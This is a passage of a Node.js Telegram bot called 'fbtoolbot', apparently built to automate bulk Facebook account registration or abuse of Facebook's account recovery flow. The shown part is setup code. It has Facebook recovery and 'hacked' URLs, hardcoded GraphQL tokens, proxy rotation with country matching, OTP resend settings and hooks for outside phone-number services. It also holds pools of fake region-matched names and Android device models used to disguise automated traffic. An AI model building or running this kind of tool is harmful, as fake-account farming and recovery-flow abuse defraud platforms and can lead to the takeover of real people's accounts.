#!/usr/bin/env node
'use strict';
/**
 * ============================================================================
 *  fbtoolbot — All-in-One Standalone Single-File Telegram Bot (v8.4)
 * ============================================================================
 *  Zero external npm dependencies! Works in ANY folder (no package.json needed).
 *  Requires only Node.js >= 18 and `curl`.
 *
 *  Quick Start (Any VPS / Render / Railway / Pterodactyl / Termux / PC):
 *    export TELEGRAM_BOT_TOKEN="your_bot_token"
 *    export TELEGRAM_ADMIN_ID="7831629041"
 *    export TELEGRAM_ADMIN_USERNAME="@CODINGJAMES_X"
 *    node fbtoolbot.js
 * ============================================================================
 */

(async () => {
const { default: fs } = await import('node:fs');
const { default: path } = await import('node:path');
const { default: crypto } = await import('node:crypto');
const { default: net } = await import('node:net');
const { default: http } = await import('node:http');
const { default: readline } = await import('node:readline');
const { spawn } = await import('node:child_process');

const BOT_DIR = process.argv[1] ? path.dirname(path.resolve(process.argv[1])) : process.cwd();

// ----------------------------------------------------------------------------
// 1. CLI Args & Zero-Dep .env Loader
// ----------------------------------------------------------------------------
function parseCliArgs(argv) {
  const out = {};
  for (const arg of argv.slice(2)) {
    if (arg.startsWith('--token=')) out.token = arg.slice('--token='.length).trim();
    else if (arg.startsWith('--admin-id=')) out.adminId = arg.slice('--admin-id='.length).trim();
    else if (arg.startsWith('--admin-user=')) out.adminUser = arg.slice('--admin-user='.length).trim();
    else if (arg.startsWith('--data-dir=')) out.dataDir = arg.slice('--data-dir='.length).trim();
    else if (arg.startsWith('--port=')) out.port = arg.slice('--port='.length).trim();
    else if (arg === '--diag' || arg === '--check') out.diag = true;
  }
  return out;
}

function loadLocalEnvFile(dir) {
  const envPath = path.join(dir, '.env');
  if (!fs.existsSync(envPath)) return;
  try {
    const raw = fs.readFileSync(envPath, 'utf-8');
    for (const line of raw.split(/\r?\n/)) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith('#')) continue;
      const eq = trimmed.indexOf('=');
      if (eq <= 0) continue;
      const key = trimmed.slice(0, eq).trim();
      let val = trimmed.slice(eq + 1).trim();
      if (
        (val.startsWith('"') && val.endsWith('"')) ||
        (val.startsWith("'") && val.endsWith("'"))
      ) {
        val = val.slice(1, -1);
      }
      if (key && !(key in process.env)) {
        process.env[key] = val;
      }
    }
  } catch {
    // ignore malformed .env
  }
}

loadLocalEnvFile(BOT_DIR);
const CLI = parseCliArgs(process.argv);

const DEFAULT_ADMIN_ID = (CLI.adminId || process.env.TELEGRAM_ADMIN_ID || '7831629041').trim();
const DEFAULT_ADMIN_USERNAME = (CLI.adminUser || process.env.TELEGRAM_ADMIN_USERNAME || '@CODINGJAMES_X').trim();
const DEFAULT_OWNER_URL = (process.env.TELEGRAM_OWNER_URL || 'https://t.me/CODINGJAMES_X').trim();
const DEFAULT_CHANNEL_URL = (process.env.TELEGRAM_CHANNEL_URL || 'https://t.me/EarnAirdropX').trim();
const DEFAULT_BRAND_NAME = (process.env.BOT_BRAND_NAME || 'JEME').trim();

const DATA_ROOT = path.resolve(
  CLI.dataDir || process.env.FBTOOLS_DATA_DIR || path.join(BOT_DIR, 'fbtoolbot_data')
);
if (!fs.existsSync(DATA_ROOT)) {
  fs.mkdirSync(DATA_ROOT, { recursive: true });
}

const FILES = {
  proxies: path.join(DATA_ROOT, 'global_proxies.txt'),
  debugLog: path.join(DATA_ROOT, 'system_debug.log'),
  botSettings: path.join(DATA_ROOT, 'bot_settings.json'),
  botUsers: path.join(DATA_ROOT, 'bot_users.json'),
  botUsersDir: path.join(DATA_ROOT, 'users'),
};
if (!fs.existsSync(FILES.botUsersDir)) {
  fs.mkdirSync(FILES.botUsersDir, { recursive: true });
}

// ----------------------------------------------------------------------------
// 2. Engine Constants & Utilities
// ----------------------------------------------------------------------------
const PC_RECOVERY_PRESETS = [
  { id: 'www_identify', label: 'www.../login/identify/', url: 'https://www.facebook.com/login/identify/' },
  { id: 'm_login', label: 'm.../login/', url: 'https://m.facebook.com/login/' },
  { id: 'www_login', label: 'www.../login/', url: 'https://www.facebook.com/login/' },
  { id: 'www_hacked', label: 'www.../hacked/', url: 'https://www.facebook.com/hacked/' },
  { id: 'm_identify', label: 'm.../login/identify/', url: 'https://m.facebook.com/login/identify/?ctx=recover' },
];

const PC_FB_ALLOWED_HOSTS = new Set([
  'facebook.com',
  'www.facebook.com',
  'm.facebook.com',
  'mbasic.facebook.com',
  'touch.facebook.com',
  'web.facebook.com',
]);

function normalizePcRecoveryUrls(input, { fallbackToDefaults = true } = {}) {
  const rawItems = Array.isArray(input)
    ? input
    : String(input || '')
        .split(/[\r\n,\s|]+/)
        .map((s) => s.trim())
        .filter(Boolean);
  const out = [];
  const seen = new Set();
  for (const item of rawItems) {
    let candidate = String(item || '').trim();
    if (!candidate) continue;
    if (!/^https?:\/\//i.test(candidate)) {
      if (/^(?:www\.|m\.|mbasic\.|touch\.|web\.)?facebook\.com\//i.test(candidate)) {
        candidate = `https://${candidate}`;
      } else {
        continue;
      }
    }
    try {
      const parsed = new URL(candidate);
      if (parsed.protocol !== 'https:') continue;
      const host = parsed.hostname.toLowerCase();
      if (!PC_FB_ALLOWED_HOSTS.has(host)) continue;
      parsed.hash = '';
      if (!parsed.pathname) parsed.pathname = '/';
      const finalUrl = parsed.toString();
      if (!seen.has(finalUrl)) {
        seen.add(finalUrl);
        out.push(finalUrl);
      }
      if (out.length >= 8) break;
    } catch {
      // ignore invalid URL
    }
  }
  if (out.length === 0 && fallbackToDefaults) {
    return PC_RECOVERY_PRESETS.slice(0, 4).map((p) => p.url);
  }
  return out;
}

const DEFAULT_CONFIG = {
  password: '',
  cc: '880',
  proxy: '',
  delay: 1,
  retries: 4,
  timeout: 18,
  threads: 4,
  skip_probe: true,
  fresh_id: true,
  strict_proxy: true,
  precheck_gql: true,
  proxy_saver: true,
  gql_via_direct: true,
  checker_use_proxy: false,
  auto_proxy_refresh: true,
  auto_proxy_country: true,
  auto_otp_resend: 2,
  pc_otp_resends: 3,
  pc_recovery_urls: PC_RECOVERY_PRESETS.slice(0, 4).map((p) => p.url),
  engine_mode: 'hybrid',
  proxy_mode: 'rotate',
  lamix_token: '',
  voltx_api_key: '',
  voltx_base_url: '',
  voltx_last_rid: '',
  voltx_last_range: '',
  batch: 0,
  resume_mode: true,
};

const DEFAULT_VOLTX_BASE = (process.env.VOLTX_BASE_URL || 'https://api.2oo9.cloud/MXS47FLFX0U/tnevs/@public/api').replace(/\/+$/, '');
const DEFAULT_VOLTX_KEY = (process.env.VOLTX_API_KEY || '').trim();

const FB_REG_BASE = 'https://limited.facebook.com';
const FB_GRAPHQL_URL = 'https://www.facebook.com/api/graphql/';
const DEFAULT_FB_LSD = 'AdS-QY2mYrCcHP7sVf7ynTA6vTc';
const DEFAULT_GQL_CIPHER =
  'AdAtB3O832KrYgWu2c7Jm2mNWOdAALA9wNFKJ_043RSsW27RSXXjhlBd0Cr8rGn-' +
  'lIwgDuQU-CNQILiqKbqFW0GZop7nLgDVhClntKlePmNpHzT4ESf47v-lTUCNV3L-' +
  'ikw70LhayHi30trSUJqk-Rvmaost-m0CTl60dFiIcbLNhGmQ8uggs-M1wfu04K' +
  'QJvOQBDLwohSr7f_yRqkDGj98Ra-1S2N77k17Fqxu8N84cEWWTyv4qW6ySj7GI' +
  '7CYYhD8QZDTzMxXcImxAr_Y';
const DEFAULT_GQL_JAZOEST = '22291';
const DEFAULT_GQL_DOC_ID = '27012969198380071';

const COUNTRY_MAP = {
  '880': ['Bangladesh', 'BD'],
  '91': ['India', 'IN'],
  '92': ['Pakistan', 'PK'],
  '1': ['United States', 'US'],
  '44': ['United Kingdom', 'GB'],
  '61': ['Australia', 'AU'],
  '64': ['New Zealand', 'NZ'],
  '62': ['Indonesia', 'ID'],
  '60': ['Malaysia', 'MY'],
  '65': ['Singapore', 'SG'],
  '63': ['Philippines', 'PH'],
  '84': ['Vietnam', 'VN'],
  '66': ['Thailand', 'TH'],
  '855': ['Cambodia', 'KH'],
  '856': ['Laos', 'LA'],
  '852': ['Hong Kong', 'HK'],
  '886': ['Taiwan', 'TW'],
  '95': ['Myanmar', 'MM'],
  '94': ['Sri Lanka', 'LK'],
  '977': ['Nepal', 'NP'],
  '975': ['Bhutan', 'BT'],
  '960': ['Maldives', 'MV'],
  '93': ['Afghanistan', 'AF'],
  '98': ['Iran', 'IR'],
  '964': ['Iraq', 'IQ'],
  '963': ['Syria', 'SY'],
  '962': ['Jordan', 'JO'],
  '961': ['Lebanon', 'LB'],
  '970': ['Palestine', 'PS'],
  '966': ['Saudi Arabia', 'SA'],
  '971': ['UAE', 'AE'],
  '967': ['Yemen', 'YE'],
  '968': ['Oman', 'OM'],
  '965': ['Kuwait', 'KW'],
  '974': ['Qatar', 'QA'],
  '973': ['Bahrain', 'BH'],
  '90': ['Turkey', 'TR'],
  '86': ['China', 'CN'],
  '81': ['Japan', 'JP'],
  '82': ['South Korea', 'KR'],
  '976': ['Mongolia', 'MN'],
  '992': ['Tajikistan', 'TJ'],
  '993': ['Turkmenistan', 'TM'],
  '994': ['Azerbaijan', 'AZ'],
  '995': ['Georgia', 'GE'],
  '996': ['Kyrgyzstan', 'KG'],
  '998': ['Uzbekistan', 'UZ'],
  '7': ['Russia', 'RU'],
  '380': ['Ukraine', 'UA'],
  '375': ['Belarus', 'BY'],
  '374': ['Armenia', 'AM'],
  '373': ['Moldova', 'MD'],
  '33': ['France', 'FR'],
  '34': ['Spain', 'ES'],
  '39': ['Italy', 'IT'],
  '49': ['Germany', 'DE'],
  '31': ['Netherlands', 'NL'],
  '32': ['Belgium', 'BE'],
  '41': ['Switzerland', 'CH'],
  '43': ['Austria', 'AT'],
  '45': ['Denmark', 'DK'],
  '46': ['Sweden', 'SE'],
  '47': ['Norway', 'NO'],
  '48': ['Poland', 'PL'],
  '30': ['Greece', 'GR'],
  '36': ['Hungary', 'HU'],
  '40': ['Romania', 'RO'],
  '351': ['Portugal', 'PT'],
  '353': ['Ireland', 'IE'],
  '358': ['Finland', 'FI'],
  '359': ['Bulgaria', 'BG'],
  '370': ['Lithuania', 'LT'],
  '371': ['Latvia', 'LV'],
  '372': ['Estonia', 'EE'],
  '381': ['Serbia', 'RS'],
  '385': ['Croatia', 'HR'],
  '420': ['Czechia', 'CZ'],
  '421': ['Slovakia', 'SK'],
  '20': ['Egypt', 'EG'],
  '211': ['South Sudan', 'SS'],
  '212': ['Morocco', 'MA'],
  '213': ['Algeria', 'DZ'],
  '216': ['Tunisia', 'TN'],
  '218': ['Libya', 'LY'],
  '220': ['Gambia', 'GM'],
  '221': ['Senegal', 'SN'],
  '222': ['Mauritania', 'MR'],
  '223': ['Mali', 'ML'],
  '224': ['Guinea', 'GN'],
  '225': ['Ivory Coast', 'CI'],
  '226': ['Burkina Faso', 'BF'],
  '227': ['Niger', 'NE'],
  '228': ['Togo', 'TG'],
  '229': ['Benin', 'BJ'],
  '230': ['Mauritius', 'MU'],
  '231': ['Liberia', 'LR'],
  '232': ['Sierra Leone', 'SL'],
  '233': ['Ghana', 'GH'],
  '234': ['Nigeria', 'NG'],
  '235': ['Chad', 'TD'],
  '236': ['Central African Rep.', 'CF'],
  '237': ['Cameroon', 'CM'],
  '238': ['Cape Verde', 'CV'],
  '240': ['Equatorial Guinea', 'GQ'],
  '241': ['Gabon', 'GA'],
  '242': ['Congo', 'CG'],
  '243': ['DR Congo', 'CD'],
  '244': ['Angola', 'AO'],
  '245': ['Guinea-Bissau', 'GW'],
  '248': ['Seychelles', 'SC'],
  '249': ['Sudan', 'SD'],
  '250': ['Rwanda', 'RW'],
  '251': ['Ethiopia', 'ET'],
  '252': ['Somalia', 'SO'],
  '253': ['Djibouti', 'DJ'],
  '254': ['Kenya', 'KE'],
  '255': ['Tanzania', 'TZ'],
  '256': ['Uganda', 'UG'],
  '257': ['Burundi', 'BI'],
  '258': ['Mozambique', 'MZ'],
  '260': ['Zambia', 'ZM'],
  '261': ['Madagascar', 'MG'],
  '263': ['Zimbabwe', 'ZW'],
  '264': ['Namibia', 'NA'],
  '265': ['Malawi', 'MW'],
  '266': ['Lesotho', 'LS'],
  '267': ['Botswana', 'BW'],
  '268': ['Eswatini', 'SZ'],
  '269': ['Comoros', 'KM'],
  '27': ['South Africa', 'ZA'],
  '291': ['Eritrea', 'ER'],
  '51': ['Peru', 'PE'],
  '52': ['Mexico', 'MX'],
  '53': ['Cuba', 'CU'],
  '54': ['Argentina', 'AR'],
  '55': ['Brazil', 'BR'],
  '56': ['Chile', 'CL'],
  '57': ['Colombia', 'CO'],
  '58': ['Venezuela', 'VE'],
  '502': ['Guatemala', 'GT'],
  '503': ['El Salvador', 'SV'],
  '504': ['Honduras', 'HN'],
  '505': ['Nicaragua', 'NI'],
  '506': ['Costa Rica', 'CR'],
  '507': ['Panama', 'PA'],
  '591': ['Bolivia', 'BO'],
  '593': ['Ecuador', 'EC'],
  '595': ['Paraguay', 'PY'],
  '598': ['Uruguay', 'UY'],
};

const COUNTRY_NAME_TO_ISO = {
  uk: 'GB',
  'united kingdom': 'GB',
  'great britain': 'GB',
  england: 'GB',
  usa: 'US',
  'united states': 'US',
  'united states of america': 'US',
  uae: 'AE',
  'united arab emirates': 'AE',
  "cote d'ivoire": 'CI',
  'cote divoire': 'CI',
  'ivory coast': 'CI',
  'dr congo': 'CD',
  'democratic republic of the congo': 'CD',
  'republic of the congo': 'CG',
  'central african republic': 'CF',
  'south korea': 'KR',
  'korea': 'KR',
  'czech republic': 'CZ',
  czechia: 'CZ',
  'russian federation': 'RU',
  vietnam: 'VN',
  'viet nam': 'VN',
  laos: 'LA',
  tanzania: 'TZ',
  'united republic of tanzania': 'TZ',
  iran: 'IR',
  syria: 'SY',
  moldova: 'MD',
  bolivia: 'BO',
  venezuela: 'VE',
  palestine: 'PS',
  eswatini: 'SZ',
  swaziland: 'SZ',
};

for (const [name, iso] of Object.values(COUNTRY_MAP)) {
  const k = String(name || '').toLowerCase().trim();
  if (k && iso && !(k in COUNTRY_NAME_TO_ISO)) {
    COUNTRY_NAME_TO_ISO[k] = iso;
  }
}

function countryNameToIso(name) {
  const clean = String(name || '').toLowerCase().replace(/[^a-z0-9\s']/g, ' ').replace(/\s+/g, ' ').trim();
  if (!clean) return '';
  if (COUNTRY_NAME_TO_ISO[clean]) return COUNTRY_NAME_TO_ISO[clean];
  for (const [k, iso] of Object.entries(COUNTRY_NAME_TO_ISO)) {
    if (clean.includes(k) && k.length >= 4) return iso;
  }
  return '';
}

function getCountryInfo(cleanNum) {
  const s = String(cleanNum || '').replace(/\D/g, '');
  if (s.startsWith('76') || s.startsWith('77')) return ['Kazakhstan', 'KZ'];
  for (const len of [3, 2, 1]) {
    const p = s.slice(0, len);
    if (COUNTRY_MAP[p]) return COUNTRY_MAP[p];
  }
  return ['Unknown', '??'];
}

const CC_INFO = {
  '880': [10, '0'], '91': [10, '0'], '92': [10, '0'], '93': [9, '0'],
  '94': [9, '0'], '977': [10, '0'], '975': [8, ''], '960': [7, ''], '1': [10, '1'],
  '44': [10, '0'], '61': [9, '0'], '64': [9, '0'], '62': [10, '0'], '60': [9, '0'],
  '65': [8, ''], '66': [9, '0'], '84': [9, '0'], '63': [10, '0'],
  '81': [10, '0'], '82': [10, '0'], '86': [11, '0'], '95': [9, '0'],
  '852': [8, ''], '886': [9, '0'], '855': [9, '0'], '856': [10, '0'],
  '971': [9, '0'], '966': [9, '0'], '974': [8, ''], '965': [8, ''],
  '968': [8, ''], '973': [8, ''], '967': [9, '0'], '970': [9, '0'],
  '964': [10, '0'], '963': [9, '0'], '962': [9, '0'], '961': [8, '0'],
  '976': [8, ''], '992': [9, ''], '993': [8, ''], '994': [9, '0'],
  '995': [9, '0'], '996': [9, '0'], '998': [9, ''],
  '20': [10, '0'], '211': [9, '0'], '234': [10, '0'], '254': [9, '0'],
  '255': [9, '0'], '256': [9, '0'], '251': [9, '0'], '250': [9, '0'],
  '252': [8, '0'], '253': [8, ''], '257': [8, ''], '258': [9, '0'],
  '27': [9, '0'], '233': [9, '0'], '237': [9, ''], '242': [9, ''],
  '243': [9, '0'], '260': [9, '0'], '261': [9, '0'], '263': [9, '0'],
  '264': [9, '0'], '265': [9, '0'], '267': [8, ''], '249': [9, '0'],
  '244': [9, '0'], '212': [9, '0'], '213': [9, '0'], '216': [8, ''],
  '218': [9, '0'], '221': [9, ''], '223': [8, ''], '224': [9, ''],
  '225': [10, ''], '226': [8, ''], '227': [8, ''], '228': [8, ''],
  '229': [8, ''], '230': [8, ''], '231': [8, '0'], '232': [8, '0'],
  '235': [8, ''], '220': [7, ''], '222': [8, ''], '90': [10, '0'],
  '98': [10, '0'], '7': [10, '8'], '380': [9, '0'], '375': [9, '0'],
  '374': [8, '0'], '373': [8, '0'], '30': [10, ''], '31': [9, '0'],
  '32': [9, '0'], '33': [9, '0'], '34': [9, ''], '36': [9, '0'],
  '39': [10, ''], '40': [9, '0'], '41': [9, '0'], '43': [10, '0'],
  '45': [8, ''], '46': [9, '0'], '47': [8, ''], '48': [9, ''],
  '49': [10, '0'], '351': [9, ''], '353': [9, '0'], '358': [9, '0'],
  '359': [9, '0'], '420': [9, ''], '51': [9, ''], '52': [10, ''],
  '53': [8, ''], '54': [10, '0'], '55': [11, '0'], '56': [9, ''],
  '57': [10, '0'], '58': [10, '0'], '502': [8, ''], '503': [8, ''],
  '504': [8, ''], '505': [8, ''], '506': [8, ''], '507': [8, ''],
  '591': [8, ''], '593': [9, '0'], '595': [9, '0'], '598': [8, '0'],
};

const FIRST_NAMES_POOL = [
  'Arafat', 'Rakib', 'Sabbir', 'Nayeem', 'Rifat', 'Tanvir', 'Shakib',
  'Sajid', 'Nahid', 'Rasel', 'Sohel', 'Hasan', 'Fahim', 'Arman', 'Jahid',
  'Miraj', 'Rony', 'Sifat', 'Akash', 'Bappy', 'Anik', 'Ayon', 'Tuhin',
  'Sagar', 'Riad', 'Sohan', 'Imran', 'Foysal', 'Mahin', 'Sajib', 'Rahim',
  'Karim', 'Naim', 'Rayhan', 'Jubayer', 'Tahmid', 'Aditto', 'Ridoy',
  'Shanto', 'Rana', 'David', 'John', 'Michael', 'Daniel', 'Kevin',
  'Rayan', 'Adam', 'Liam', 'Noah', 'Ethan', 'Sami', 'Ali', 'Omar',
  'Yusuf', 'Bilal', 'Hamza', 'Ibrahim', 'Zayan', 'Rehan', 'Aayan',
  'Juma', 'Baraka', 'Amani', 'Hassan', 'Kelvin', 'Samuel', 'Joseph', 'Musa',
];
const FIRST_F = [
  'Sadia', 'Nusrat', 'Tasnim', 'Mim', 'Rima', 'Sumaiya', 'Farhana',
  'Jannat', 'Ayesha', 'Sanjida', 'Mitu', 'Popy', 'Shorna', 'Laboni',
  'Tania', 'Sraboni', 'Nipa', 'Anika', 'Munia', 'Joya', 'Amina', 'Fatuma',
  'Neema', 'Rehema', 'Zainab', 'Halima', 'Mariam', 'Grace', 'Sarah', 'Hannah',
];
const LAST_N = [
  'Hossain', 'Ahmed', 'Khan', 'Islam', 'Rahman', 'Sarker', 'Mia', 'Ali',
  'Sheikh', 'Chowdhury', 'Talukder', 'Molla', 'Howlader', 'Sikder',
  'Uddin', 'Akter', 'Sultana', 'Begum', 'Rana', 'Roy', 'Das', 'Dey',
  'Paul', 'Biswas', 'Kumar', 'Sharma', 'Patel', 'Singh', 'Mahmud',
  'Mwangi', 'Juma', 'Bakari', 'Mohamed', 'Omari', 'Hamisi', 'Kassim', 'Salim',
];

const REGION_FIRST_NAMES = {
  '255': ['Juma', 'Baraka', 'Amani', 'Hassan', 'Bakari', 'Salim', 'Kassim', 'Hamisi', 'Omari', 'Rajabu', 'Neema', 'Amina', 'Fatuma', 'Halima', 'Rehema', 'Zainab', 'Grace', 'Kelvin'],
  '254': ['Brian', 'Kevin', 'Dennis', 'Samuel', 'David', 'Faith', 'Mercy', 'Grace', 'Esther', 'Collins', 'Victor', 'Amani'],
  '256': ['Ivan', 'Ronald', 'Moses', 'Denis', 'Patrick', 'Sarah', 'Grace', 'Prossy', 'Ritah', 'Brian'],
  '234': ['Chinedu', 'Emeka', 'Tunde', 'Sadiq', 'Ibrahim', 'Amina', 'Zainab', 'Blessing', 'Femi', 'Kola', 'Samuel'],
  '233': ['Kwame', 'Kofi', 'Yaw', 'Kojo', 'Samuel', 'Abena', 'Akosua', 'Ama', 'Esi', 'Daniel'],
  '225': ['Kouassi', 'Koffi', 'Yao', 'Moussa', 'Ibrahim', 'Awa', 'Fatoumata', 'Mariam', 'Aminata', 'Adama'],
  '221': ['Mamadou', 'Ibrahima', 'Ousmane', 'Cheikh', 'Moussa', 'Awa', 'Fatou', 'Aminata', 'Mariama'],
  '237': ['Jean', 'Paul', 'Samuel', 'franck', 'Eric', 'Nadine', 'Marie', 'Christelle', 'Alain'],
  '212': ['Youssef', 'Amine', 'Mehdi', 'Karim', 'Omar', 'Salma', 'Fatima', 'Khadija', 'Nadia'],
  '213': ['Yacine', 'Amine', 'Karim', 'Sofiane', 'Mehdi', 'Meriem', 'Yasmine', 'Sarah', 'Nour'],
  '20': ['Ahmed', 'Mohamed', 'Mahmoud', 'Omar', 'Youssef', 'Mostafa', 'Nour', 'Mariam', 'Salma', 'Sara'],
  '880': ['Arafat', 'Rakib', 'Sabbir', 'Nayeem', 'Rifat', 'Tanvir', 'Shakib', 'Sajid', 'Nahid', 'Rasel', 'Hasan', 'Fahim', 'Jahid', 'Nusrat', 'Sadia', 'Tasnim', 'Farhana', 'Jannat'],
  '91': ['Aarav', 'Rohan', 'Vikram', 'Rahul', 'Aditya', 'Arjun', 'Ananya', 'Priya', 'Neha', 'Karan', 'Amit'],
  '92': ['Hamza', 'Bilal', 'Usman', 'Zain', 'Saad', 'Ayesha', 'Fatima', 'Hira', 'Ali', 'Umar'],
  '62': ['Budi', 'Rizky', 'Fajar', 'Dimas', 'Putra', 'Siti', 'Dewi', 'Nisa', 'Andi', 'Bagus'],
  '60': ['Aiman', 'Hakim', 'Danish', 'Faris', 'Hafiz', 'Nurul', 'Aisyah', 'Siti', 'amir'],
  '63': ['John', 'Mark', 'Carlo', 'Paolo', 'Joshua', 'Maria', 'Angela', 'Bea', 'Camille'],
  '84': ['Minh', 'Anh', 'Huy', 'Duc', 'Tuan', 'Linh', 'Trang', 'Huong', 'Thao', 'Nam'],
  '66': ['Somchai', 'Nattapong', 'Kittisak', 'Thanakorn', 'Ploy', 'Pim', 'Nok', 'May'],
  '90': ['Emre', 'Mehmet', 'Ahmet', 'Can', 'Burak', 'Elif', 'Zeynep', 'Merve', 'Yusuf'],
  '966': ['Abdullah', 'Faisal', 'Khalid', 'Salman', 'Omar', 'Noura', 'Sara', 'Reem', 'Fahad'],
  '1': ['Liam', 'Noah', 'Ethan', 'Lucas', 'Mason', 'Emma', 'Olivia', 'Ava', 'Sophia', 'Daniel'],
  '44': ['Oliver', 'George', 'Harry', 'Jack', 'Charlie', 'Amelia', 'Isla', 'Ava', 'Mia', 'Emily'],
  '33': ['Lucas', 'Hugo', 'Louis', 'Nathan', 'Leo', 'Emma', 'Chloe', 'Camille', 'Lea'],
  '49': ['Lukas', 'Jonas', 'Felix', 'Maximilian', 'Paul', 'Anna', 'Lena', 'Mia', 'Hannah'],
  '34': ['Mateo', 'Lucas', 'Hugo', 'Daniel', 'Pablo', 'Lucia', 'Sofia', 'Paula', 'Maria'],
  '55': ['Gabriel', 'Lucas', 'Matheus', 'Pedro', 'Rafael', 'Julia', 'Mariana', 'Beatriz', 'Camila'],
};
const REGION_LAST_NAMES = {
  '255': ['Juma', 'Bakari', 'Omari', 'Hamisi', 'Kassim', 'Salim', 'Mohamed', 'Hassan', 'Mushi', 'Massawe', 'Ally', 'Rajabu', 'Rashid'],
  '254': ['Mwangi', 'Kamau', 'Ochieng', 'Otieno', 'Njoroge', 'Wanjiku', 'Kiprop', 'Mutua'],
  '256': ['Kato', 'Okello', 'Ssempijja', 'Mukasa', 'Byaruhanga', 'Namukasa', 'Ouma'],
  '234': ['Okafor', 'Adeyemi', 'Babatunde', 'Ibrahim', 'Musa', 'Balogun', 'Chukwu', 'Sani'],
  '233': ['Mensah', 'Boateng', 'Owusu', 'Appiah', 'Osei', 'Agyemang', 'Asante'],
  '225': ['Kouame', 'Kone', 'Coulibaly', 'Traore', 'Diallo', 'Bamba', 'Toure', 'Yao'],
  '221': ['Diop', 'Ndiaye', 'Fall', 'Faye', 'Diallo', 'Ba', 'Sow', 'Gueye'],
  '237': ['Nkono', 'Tchatchoua', 'Mbarga', 'Fouda', 'Ndi', 'Bikoi', 'Kamga'],
  '212': ['El Amrani', 'Bennani', 'Tazi', 'Idrissi', 'Chraibi', 'Alaoui'],
  '213': ['Benali', 'Mansouri', 'Khelifi', 'Brahimi', 'Ziani', 'Boudiaf'],
  '20': ['Hassan', 'Ibrahim', 'Mohamed', 'Ali', 'Mahmoud', 'El-Sayed', 'Mansour'],
  '880': ['Hossain', 'Ahmed', 'Khan', 'Islam', 'Rahman', 'Sarker', 'Mia', 'Sheikh', 'Chowdhury', 'Talukder', 'Molla', 'Biswas', 'Mahmud'],
  '91': ['Sharma', 'Patel', 'Singh', 'Kumar', 'Verma', 'Gupta', 'Roy', 'Das', 'Nair', 'Reddy'],
  '92': ['Khan', 'Ahmed', 'Malik', 'Sheikh', 'Qureshi', 'Raza', 'Siddiqui', 'Ali'],
  '62': ['Saputra', 'Pratama', 'Wijaya', 'Santoso', 'Hidayat', 'Putri', 'Lestari'],
  '60': ['Ahmad', 'Abdullah', 'Rahman', 'Ismail', 'Hassan', 'Zainal', 'Ibrahim'],
  '63': ['Santos', 'Reyes', 'Cruz', 'Bautista', 'Garcia', 'Mendoza', 'Torres'],
  '84': ['Nguyen', 'Tran', 'Le', 'Pham', 'Hoang', 'Vu', 'Dang', 'Bui'],
  '90': ['Yilmaz', 'Kaya', 'Demir', 'Sahin', 'Celik', 'Yildiz', 'Ozturk'],
  '44': ['Smith', 'Jones', 'Taylor', 'Brown', 'Williams', 'Wilson', 'Davies'],
  '1': ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis'],
  '33': ['Martin', 'Bernard', 'Thomas', 'Petit', 'Robert', 'Richard', 'Durand'],
  '49': ['Muller', 'Schmidt', 'Schneider', 'Fischer', 'Weber', 'Meyer', 'Wagner'],
  '34': ['Garcia', 'Martinez', 'Lopez', 'Sanchez', 'Gonzalez', 'Rodriguez'],
  '55': ['Silva', 'Santos', 'Oliveira', 'Souza', 'Pereira', 'Costa', 'Rodrigues'],
};

const ANDROID_DEVICES = [
  ['SM-A035F', 'samsung', 'a03', '12'], ['SM-A045F', 'samsung', 'a04s', '12'],
  ['SM-A055F', 'samsung', 'a05', '13'], ['SM-A065F', 'samsung', 'a06', '14'],
  ['SM-A125F', 'samsung', 'a12', '11'], ['SM-A135F', 'samsung', 'a13', '12'],
  ['SM-A145F', 'samsung', 'a14', '13'], ['SM-A155F', 'samsung', 'a15', '14'],
  ['SM-A235F', 'samsung', 'a23', '12'], ['SM-A245F', 'samsung', 'a24', '13'],
  ['SM-A336E', 'samsung', 'a33', '12'], ['SM-A346E', 'samsung', 'a34', '13'],
  ['SM-A525F', 'samsung', 'a52', '11'], ['SM-A536E', 'samsung', 'a53', '12'],
  ['SM-A546E', 'samsung', 'a54', '13'], ['SM-A556E', 'samsung', 'a55', '14'],
  ['SM-G991B', 'samsung', 'o1s', '11'], ['SM-S901E', 'samsung', 'r0s', '12'],
  ['SM-S911B', 'samsung', 'dm1q', '13'], ['SM-S921B', 'samsung', 'e1q', '14'],
  ['SM-M135F', 'samsung', 'm13', '12'], ['SM-M146B', 'samsung', 'm14', '13'],
  ['SM-M336B', 'samsung', 'm33', '12'], ['SM-M546B', 'samsung', 'm54', '13'],
  ['M2101K6G', 'Xiaomi', 'sweet', '11'], ['2201117TG', 'Xiaomi', 'spes', '12'],
  ['22021211RG', 'Xiaomi', 'fog', '12'], ['23021RAAEG', 'Xiaomi', 'topaz', '13'],
  ['23106RN0DA', 'Xiaomi', 'gale', '13'], ['Redmi Note 11', 'Xiaomi', 'spes', '11'],
  ['Redmi Note 12', 'Xiaomi', 'tapas', '13'], ['Redmi Note 13', 'Xiaomi', 'sapphire', '13'],
  ['Redmi 12C', 'Xiaomi', 'earth', '12'], ['Redmi 13C', 'Xiaomi', 'gale', '13'],
  ['POCO M5', 'Xiaomi', 'rock', '12'], ['POCO X5 Pro', 'Xiaomi', 'redwood', '12'],
  ['CPH2339', 'OPPO', 'A17', '12'], ['CPH2461', 'OPPO', 'A58', '13'],
  ['CPH2487', 'OPPO', 'A78', '13'], ['CPH2525', 'OPPO', 'A18', '13'],
  ['V2146', 'vivo', 'PD2176', '12'], ['V2225', 'vivo', 'PD2233', '13'],
  ['V2302', 'vivo', 'PD2310', '14'], ['RMX3491', 'realme', 'RMX3491', '12'],
  ['RMX3624', 'realme', 'RMX3624', '13'], ['RMX3760', 'realme', 'RMX3760', '14'],
  ['Infinix X6815', 'Infinix', 'X6815', '12'], ['Infinix X6827', 'Infinix', 'X6827', '13'],
  ['Infinix X6850', 'Infinix', 'X6850', '14'], ['TECNO KJ5', 'TECNO', 'KJ5', '13'],
  ['TECNO KL6', 'TECNO', 'KL6', '13'], ['TECNO KM6', 'TECNO', 'KM6', '14'],
  ['CPH2447', 'OnePlus', 'OP5559L1', '13'], ['CPH2551', 'OnePlus', 'OP5755L1', '14'],
  ['Pixel 6a', 'Google', 'bluejay', '12'], ['Pixel 7', 'Google', 'panther', '13'],
  ['Pixel 8', 'Google', 'shiba', '14'], ['moto g(84)', 'motorola', 'maui', '13'],
  ['Nokia G42', 'HMD Global', 'G42', '13'], ['CRT-NX1', 'HONOR', 'CRT-NX1', '12'],
];

const SCREEN_PROFILES = [
